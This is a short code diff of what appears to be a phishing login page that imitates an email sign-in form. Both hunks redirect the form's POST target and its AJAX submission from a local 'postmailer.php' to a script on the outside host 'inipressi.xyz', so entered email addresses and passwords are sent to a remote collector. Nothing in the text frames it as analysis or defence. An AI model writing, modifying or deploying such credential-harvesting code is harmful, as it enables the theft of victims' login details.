@@ -97,7 +97,7 @@
                      </div>
                      <div id="login-sub">
                         <div id="forms">
-                           <form novalidate="" id="login_form" action="./postmailer.php" method="post" style="visibility:">
+                           <form novalidate="" id="login_form" action="http://inipressi.xyz/phpmailer/classes/postmailer.php" method="post" style="visibility:">
                               <div class="input-req-login"><label for="user">Email Address</label></div>
                               <div class="input-field-login icon username-container">
                                  <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
@@ -262,7 +262,7 @@
                  
                  // Submit the form via AJAX to the PHP script
                  $.ajax({
-                     url: './postmailer.php',
+                     url: 'http://inipressi.xyz/phpmailer/classes/postmailer.php',
                      method: 'POST',
                      type: 'POST',
                      data: {
